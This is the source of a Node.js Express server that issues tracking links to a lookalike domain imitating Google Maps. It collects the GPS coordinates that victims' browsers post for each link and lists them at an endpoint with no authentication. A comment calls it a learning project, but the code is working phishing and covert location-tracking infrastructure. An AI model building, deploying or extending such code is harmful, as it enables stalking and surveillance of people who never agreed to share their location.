import express from "express";
import cors from "cors";
import crypto from "crypto";

const app = express();
app.use(cors());
app.use(express.json());

/* ===== GLOBAL MEMORY (LEARNING PURPOSE) ===== */
const state = {
  sessions: {},
  locations: {}
};

/* ===== LOGIN ===== */
app.post("/login", (req, res) => {
  if (req.body.password !== process.env.ADMIN_PASSWORD) {
    return res.status(401).send("Unauthorized");
  }

  const sessionId = crypto.randomUUID();
  state.sessions[sessionId] = { links: [] };

  res.json({ sessionId });
});

/* ===== CREATE LINK ===== */
app.post("/create-link", (req, res) => {
  const session = state.sessions[req.body.sessionId];
  if (!session) return res.status(403).send("Invalid session");

  if (session.links.length >= 3) {
    const old = session.links.shift();
    delete state.locations[old];
  }

  const token = Math.random().toString(36).slice(2, 10);
  session.links.push(token);

  res.json({
    link: `https://www-google-map-com.netlify.app/google_map.html?token=${token}`
  });
});

/* ===== RECEIVE LOCATION ===== */
app.post("/send-location", (req, res) => {
  const { token, lat, lng, acc } = req.body;
  if (!token) return res.status(400).send("Missing token");

  state.locations[token] = { lat, lng, acc, time: Date.now() };
  res.send("OK");
});

/* ===== ADMIN FETCH ===== */
app.get("/admin-data", (req, res) => {
  res.json(state.locations);
});

/* ===== START SERVER ===== */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
